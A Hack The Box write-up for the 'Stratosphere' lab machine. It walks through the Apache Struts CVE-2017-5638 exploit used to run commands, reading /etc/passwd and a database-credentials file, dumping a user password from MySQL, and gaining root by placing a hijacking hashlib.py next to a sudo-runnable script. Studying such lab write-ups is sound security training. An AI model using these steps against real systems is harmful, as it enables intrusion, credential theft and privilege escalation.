---
title:  "Hackthebox - Stratosphere"
date:   2018-09-13 21:33:28 +0200
categories: hackthebox
published: true
---

{% include image-center.html url="/assets/htb-stratosphere.png" alt="Info Card" %}

## user

Scanning the box with [nmap](https://tools.kali.org/information-gathering/nmap) revealed 3 open ports: SSH on port 22 and some web servers on port 80 and 8080, as well as quite a lot of information about those web servers: 

```bash
# Nmap 7.70 scan initiated Thu Aug 30 23:58:36 2018 as: nmap -sV -sC -oA stratosphere 10.10.10.64
Nmap scan report for 10.10.10.64
Host is up (0.024s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:16:37:d4:3c:18:04:15:c4:02:01:0d:db:07:ac:2d (RSA)
|   256 e3:77:7b:2c:23:b0:8d:df:38:35:6c:40:ab:f6:81:50 (ECDSA)
|_  256 d7:6b:66:9c:19:fc:aa:66:6c:18:7a:cc:b5:87:0e:40 (ED25519)
80/tcp   open  http
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1114
|     Date: Thu, 30 Aug 2018 21:58:49 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
|     Found</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body>
|   GetRequest: 
|     HTTP/1.1 200 
|     Accept-Ranges: bytes
|     ETag: W/"1708-1519762495000"
|     Last-Modified: Tue, 27 Feb 2018 20:14:55 GMT
|     Content-Type: text/html
|     Content-Length: 1708
|     Date: Thu, 30 Aug 2018 21:58:49 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta charset="utf-8"/>
|     <title>Stratosphere</title>
|     <link rel="stylesheet" type="text/css" href="main.css">
|     </head>
|     <body>
|     <div id="background"></div>
|     <header id="main-header" class="hidden">
|     <div class="container">
|     <div class="content-wrap">
|     <p><i class="fa fa-diamond"></i></p>
|     <nav>
|     class="btn" href="GettingStarted.html">Get started</a>
|     </nav>
|     </div>
|     </div>
|     </header>
|     <section id="greeting">
|     <div class="container">
|     <div class="content-wrap">
|     <h1>Stratosphere<br>We protect your credit.</h1>
|     class="btn" href="GettingStarted.html">Get started now</a>
|     <p><i class="ar
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
|     Content-Length: 0
|     Date: Thu, 30 Aug 2018 21:58:49 GMT
|     Connection: close
|   RTSPRequest, X11Probe: 
|     HTTP/1.1 400 
|     Date: Thu, 30 Aug 2018 21:58:49 GMT
|_    Connection: close
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Stratosphere
8080/tcp open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1114
|     Date: Thu, 30 Aug 2018 21:58:49 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
|     Found</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body>
|   GetRequest: 
|     HTTP/1.1 200 
|     Accept-Ranges: bytes
|     ETag: W/"1708-1519762495000"
|     Last-Modified: Tue, 27 Feb 2018 20:14:55 GMT
|     Content-Type: text/html
|     Content-Length: 1708
|     Date: Thu, 30 Aug 2018 21:58:49 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta charset="utf-8"/>
|     <title>Stratosphere</title>
|     <link rel="stylesheet" type="text/css" href="main.css">
|     </head>
|     <body>
|     <div id="background"></div>
|     <header id="main-header" class="hidden">
|     <div class="container">
|     <div class="content-wrap">
|     <p><i class="fa fa-diamond"></i></p>
|     <nav>
|     class="btn" href="GettingStarted.html">Get started</a>
|     </nav>
|     </div>
|     </div>
|     </header>
|     <section id="greeting">
|     <div class="container">
|     <div class="content-wrap">
|     <h1>Stratosphere<br>We protect your credit.</h1>
|     class="btn" href="GettingStarted.html">Get started now</a>
|     <p><i class="ar
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
|     Content-Length: 0
|     Date: Thu, 30 Aug 2018 21:58:49 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Date: Thu, 30 Aug 2018 21:58:49 GMT
|_    Connection: close
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Stratosphere
<snip>
```

When opening up `http://10.10.10.64` and `http://10.10.10.64:8080` in a web browser, a very colorful but otherwise pretty static website with the title `Stratosphere` shows up. It looks like the same site is served on both ports.

Enumerating hidden directories with [dirb](https://tools.kali.org/web-applications/dirb) and the default wordlist on Kali showed 2 directories: `manager` and `host-manager`.

When visiting the corresponding URLs, a login prompt (HTTP basic auth) for the tomcat management console shows up.

Opening an invalid URL such as `http://10.10.10.64/asdf` triggers the default Tomcat 404 error page. This reveals the Tomcat version in use: `Apache Tomcat/8.5.14 (Debian)`. 

I lost a lot of time trying to brute-force the Tomcat login page with Hydra and trying to apply known Tomcat exploits that were found by [searchsploit](https://www.exploit-db.com/searchsploit/). Nothing worked.

After using [Gobuster](https://tools.kali.org/web-applications/gobuster) with a different wordlist (`/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`), another directory was revealed: `Monitoring`.

Opening `http://10.10.10.64/Monitoring` in a browser shows another website with the title "Stratosphere Credit Monitoring" with two buttons: "Sign On" and "Register". When clicking on "Register", an "Under Construction" message is displayed, whereas the "Login" button opens up a login screen that requests username and password.

When looking at the HTML of the login form, the form has some unusual content, the form action consists of a URL with the extension `.action`:

```html
<form id="Login" name="Login" action="/Monitoring/example/Login.action" method="post" class="login">
	<table class="login">
		<tbody>
			<tr>
				<td class="tdLabel"><label for="Login_username" class="label">User Name: </label></td>
				<td><input name="username" value="" id="Login_username" type="text"></td>
			</tr>
			<tr>
				<td class="tdLabel"><label for="Login_password" class="label">Password: </label></td>
				<td><input name="password" id="Login_password" type="password"></td>
			</tr>
			<tr>
				<td colspan="2"><div align="right"><input value="Submit" id="Login_0" class="btn btn-primary btn-block btn-large" type="submit"></div>
				</td>
			</tr>
		</tbody>
	</table>
</form>
```

The URL of the login page is `http://10.10.10.64:8080/Monitoring/example/Login_input.action`, which has the same extension as well.

When trying to change the `action` part of the URL to the field ID (just trying out random stuff) and opening `http://10.10.10.64:8080/Monitoring/example/Login_username.action`, a Java stacktrace showed up:

```java
Exception: java.lang.NoSuchMethodException: example.Login.username()
Stack trace:

java.lang.NoSuchMethodException: example.Login.username()
	at java.lang.Class.getMethod(Class.java:1786)
	at org.apache.struts2.interceptor.validation.AnnotationValidationInterceptor.getActionMethod(AnnotationValidationInterceptor.java:83)
	at org.apache.struts2.interceptor.validation.AnnotationValidationInterceptor.doIntercept(AnnotationValidationInterceptor.java:55)
	at com.opensymphony.xwork2.interceptor.MethodFilterInterceptor.intercept(MethodFilterInterceptor.java:98)
	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
	at com.opensymphony.xwork2.interceptor.ConversionErrorInterceptor.intercept(ConversionErrorInterceptor.java:138)
	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
	at com.opensymphony.xwork2.interceptor.ParametersInterceptor.doIntercept(ParametersInterceptor.java:229)
	at com.opensymphony.xwork2.interceptor.MethodFilterInterceptor.intercept(MethodFilterInterceptor.java:98)
	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
	at com.opensymphony.xwork2.interceptor.ParametersInterceptor.doIntercept(ParametersInterceptor.java:229)
	at com.opensymphony.xwork2.interceptor.MethodFilterInterceptor.intercept(MethodFilterInterceptor.java:98)
	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
	at com.opensymphony.xwork2.interceptor.StaticParametersInterceptor.intercept(StaticParametersInterceptor.java:191)
	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
	at org.apache.struts2.interceptor.MultiselectInterceptor.intercept(MultiselectInterceptor.java:73)
	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
	at org.apache.struts2.interceptor.DateTextFieldInterceptor.intercept(DateTextFieldInterceptor.java:125)
	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
	at org.apache.struts2.interceptor.CheckboxInterceptor.intercept(CheckboxInterceptor.java:91)
	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
	at org.apache.struts2.interceptor.FileUploadInterceptor.intercept(FileUploadInterceptor.java:253)
	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
	at com.opensymphony.xwork2.interceptor.ModelDrivenInterceptor.intercept(ModelDrivenInterceptor.java:100)
	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
	at com.opensymphony.xwork2.interceptor.ScopedModelDrivenInterceptor.intercept(ScopedModelDrivenInterceptor.java:141)
	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
	at com.opensymphony.xwork2.interceptor.ChainingInterceptor.intercept(ChainingInterceptor.java:145)
	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
	at com.opensymphony.xwork2.interceptor.PrepareInterceptor.doIntercept(PrepareInterceptor.java:171)
	at com.opensymphony.xwork2.interceptor.MethodFilterInterceptor.intercept(MethodFilterInterceptor.java:98)
	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
	at com.opensymphony.xwork2.interceptor.I18nInterceptor.intercept(I18nInterceptor.java:140)
	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
	at org.apache.struts2.interceptor.ServletConfigInterceptor.intercept(ServletConfigInterceptor.java:164)
	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
	at com.opensymphony.xwork2.interceptor.AliasInterceptor.intercept(AliasInterceptor.java:193)
	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
	at com.opensymphony.xwork2.interceptor.ExceptionMappingInterceptor.intercept(ExceptionMappingInterceptor.java:189)
	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
	at org.apache.struts2.impl.StrutsActionProxy.execute(StrutsActionProxy.java:54)
	at org.apache.struts2.dispatcher.Dispatcher.serviceAction(Dispatcher.java:575)
	at org.apache.struts2.dispatcher.ng.ExecuteOperations.executeAction(ExecuteOperations.java:81)
	at org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter.doFilter(StrutsPrepareAndExecuteFilter.java:99)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:199)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:478)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:140)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:80)
	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:624)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:342)
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:799)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:861)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1455)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.lang.Thread.run(Thread.java:748)
```

It looks like we can reference arbitrary Java methods by changing the URL. I played around with this a little but I could not manage to escape the `example` package which is pretty useless.

Afterwards, I used Searchsploit to find Struts vulnerabilities because Struts shows up in the stacktrace and I remembered that there were some issues in the past. I decided that the following result looks promising because it' s RCE, it's written in Python and it's the newest available exploit:

```bash
$ searchsploit x 41570
---------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                  |  Path
								| (/usr/share/exploitdb/)
---------------------------------------------------------------- ----------------------------------------
Apache Struts 2.3.5 < 2.3.31 / 2.5 < 2.5.10 - Remote Code Execu | exploits/linux/webapps/41570.py
---------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

The [exploit](https://www.exploit-db.com/exploits/41570/) worked instantly without modification: 

```bash
$ python apache-struts-cve-2017-5638.py http://10.10.10.64:8080/Monitoring/example id
2018-09-01 00:24:25 [*] CVE: 2017-5638 - Apache Struts2 S2-045
2018-09-01 00:24:25 [*] cmd: id
2018-09-01 00:24:25 
2018-09-01 00:24:33 uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)
2018-09-01 00:24:33 
```

This enables issuing arbitrary commands to the server, but only with the permissions of the `tomcat8` user, which is probably not sufficient for reading the user flag. 

Let's see which users exist on the system:

```bash
$ python apache-struts-cve-2017-5638.py http://10.10.10.64/Monitoring/example "cat /etc/passwd"
[*] CVE: 2017-5638 - Apache Struts2 S2-045
[*] cmd: cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
rtkit:x:105:109:RealtimeKit,,,:/proc:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/bin/false
messagebus:x:107:110::/var/run/dbus:/bin/false
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
speech-dispatcher:x:109:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
lightdm:x:111:113:Light Display Manager:/var/lib/lightdm:/bin/false
pulse:x:112:114:PulseAudio daemon,,,:/var/run/pulse:/bin/false
avahi:x:113:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
saned:x:114:118::/var/lib/saned:/bin/false
richard:x:1000:1000:Richard F Smith,,,:/home/richard:/bin/bash
tomcat8:x:115:119::/var/lib/tomcat8:/bin/bash
mysql:x:116:120:MySQL Server,,,:/nonexistent:/bin/false
```

We probably need to get access as `richard`.

Afterwards, I checked the content of the current directory:

```bash
$ python apache-struts-cve-2017-5638.py http://10.10.10.64/Monitoring/example "ls -al"
[*] CVE: 2017-5638 - Apache Struts2 S2-045
[*] cmd: ls -al

total 24
drwxr-xr-x  5 root    root    4096 Sep  2 03:47 .
drwxr-xr-x 42 root    root    4096 Oct  3  2017 ..
lrwxrwxrwx  1 root    root      12 Sep  3  2017 conf -> /etc/tomcat8
-rw-r--r--  1 root    root      68 Oct  2  2017 db_connect
drwxr-xr-x  2 tomcat8 tomcat8 4096 Sep  3  2017 lib
lrwxrwxrwx  1 root    root      17 Sep  3  2017 logs -> ../../log/tomcat8
drwxr-xr-x  2 root    root    4096 Sep  2 03:47 policy
drwxrwxr-x  4 tomcat8 tomcat8 4096 Feb 10  2018 webapps
lrwxrwxrwx  1 root    root      19 Sep  3  2017 work -> ../../cache/tomcat8
```

The `db_connect` file sounds the most interesting, therefore, I checked its content: 

```bash
$ python apache-struts-cve-2017-5638.py http://10.10.10.64/Monitoring/example "cat db_connect"                                                                         
[*] CVE: 2017-5638 - Apache Struts2 S2-045
[*] cmd: cat db_connect

[ssn]
user=ssn_admin
pass=AWs64@on*&

[users]
user=admin
pass=admin
```

There are some credentials inside, but I had no clue where to use them and temporarily gave up on them as the did not work for logging in to the Tomcat management console. I first got lost a bit because I really thought that it is necessary to get into the Tomcat management console. I found some credentials in `tomcat-users.xml` as well, but they did not work either. I tried to check all configuration files of Tomcat to see whether any of those contain interesting stuff, but was out of luck.

Afterwards, I went back one step and thought about what I've got that looks promising. I still did not find out where to apply the credentials I found. Probably some DB credentials? This would fit to the credential file name and to having a `mysql` user on the system. 

My first attempts to connect to the mysql server using the command `mysql -u ssn_admin -p 'AWs64@on*&'` completely failed, they produced Java stacktraces. I searched for other ways to get the data out of the database. I found out that `mysqldump` is installed as well and tried to dump all database content with the command: `mysqldump -u ssn_admin -p 'AWs64@on*&' --all-databases > /tmp/alldb.sql`. This also produced a stacktrace. I got a bit desperate before I found out that I need to escape the single quotes (they are probably used in Struts for surrounding the vulnerable String containing user input, but that's just a guess). [Ippsec's youtube video](https://www.youtube.com/watch?v=uMwcJQcUnmY) shows a much more clever approach to using RCE on this box: instead of issuing commands using the plain exploit, he uses a webshell in order to enable easier interaction with the box straight from the beginning.

Afterwards, the `mysql` commands started working. The credentials were working as well: 

```bash
$ python apache-struts-cve-2017-5638.py http://10.10.10.64/Monitoring/example "mysql -u ssn_admin -p\'AWs64@on*&\' -e \'show databases\'"
[*] CVE: 2017-5638 - Apache Struts2 S2-045
[*] cmd: mysql -u ssn_admin -p\'AWs64@on*&\' -e \'show databases\'

Database
information_schema
ssn
```

Again, I was scratching my head what to do after accessing the mysql server. I only had access to the `ssn` database and `information_schema`. I tried to get some more information searching through the `information_schema` database. I could not access `Database`, neither could I find another way in.

After hours of failure, I remembered the second user in the credentials file and that I never really checked which databases he has access to. I felt so stupid after checking:

```bash
$ python apache-struts-cve-2017-5638.py http://10.10.10.64/Monitoring/example "mysql -u admin -p\'admin\' -e \'show databases\'"
[*] CVE: 2017-5638 - Apache Struts2 S2-045
[*] cmd: mysql -u admin -p\'admin\' -e \'show databases\'

Database
information_schema
users
```

The `users` database sounded really promising and contained a password for `richard` inside the `accounts` table:

```bash
$ python apache-struts-cve-2017-5638.py http://10.10.10.64:8080/Monitoring/example "mysql -u admin -p\'admin\' -e \'use users; select * from accounts\'"
[*] CVE: 2017-5638 - Apache Struts2 S2-045
[*] cmd: mysql -u admin -p\'admin\' -e \'use users; select * from accounts\'

fullName        password        username
Richard F. Smith        9tc*rhKuG5TyXvUJOrE^5CK7k       richard
```

The password happened to be the SSH password, which enabled me to read the flag from `/home/richard/users.txt`.


## root

In contrast to getting user, id dit not take me very long to get root. Inside richard's home directory, there was a Python script that challenges a user with inputting some hashes. I did not try to complete the challenge, instead I used [LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) to enumerate a bit more on the machine. Reading through the report, the following part caught my attention:

```bash
We can sudo without supplying a password!
Matching Defaults entries for richard on stratosphere:
	env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User richard may run the following commands on stratosphere:
	(ALL) NOPASSWD: /usr/bin/python* /home/richard/test.py


[+] Possible sudo pwnage!
/usr/bin/python*
```

Wait - we can use `sudo` to become root without supplying a password by executing that python script?!

The python script itself was not writable by richard, that would have been too easy. But it includes the `hashlib` library... As it is possible to `overwrite` imports by simply supplying a file with the same name in the same directory as the script itself and richard could add files in his home directory, I added `hashlib.py` with the following content:

```python
with open("/root/root.txt", "r") as f:
	print("Flag: {}".format(f.read()))
```

This code gets executed straightaway when executing the `test.py`script, this enabled me to read the flag from `/root/root.txt` without even starting to answer the hash challenges.
